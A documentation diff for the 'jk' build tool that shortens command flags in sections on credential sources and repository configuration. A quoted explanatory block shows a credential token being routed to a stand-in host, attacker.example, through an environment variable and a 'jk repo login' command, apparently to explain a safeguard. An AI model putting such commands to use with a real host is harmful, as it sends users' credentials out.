@@ -220,7 +220,7 @@ Sources, in order — the first that yields a credential wins:
 Tool distribution mirrors and npm registries use the same chain, keyed by host — see
 [Config § Tool mirrors](config.md#tool-mirrors) and [Config § Node network](config.md#node-network).
 
-`jk publish --central` reads the id `central`, bound to `https://central.sonatype.com` — see
+`jk publish -c` reads the id `central`, bound to `https://central.sonatype.com` — see
 [Publish: Maven Central](publish.md#maven-central).
 
 ### A name is not a destination
@@ -275,7 +275,7 @@ read a variable of your shell into a repository's credential or object-store key
 could name any of them. To send one, declare [repositories.internal] with this URL and the ${VAR}
 reference in ~/.jk/config.toml,
 export JK_REPO_INTERNAL_TOKEN (or JK_REPO_INTERNAL_USERNAME + JK_REPO_INTERNAL_PASSWORD) with
-JK_REPO_INTERNAL_HOST=attacker.example, or run `jk repo login internal --url https://attacker.example/`.
+JK_REPO_INTERNAL_HOST=attacker.example, or run `jk repo login internal -U https://attacker.example/`.
 ```
 
 The rule covers every `${VAR}` a `[repositories.<id>]` table writes, not only `token` /
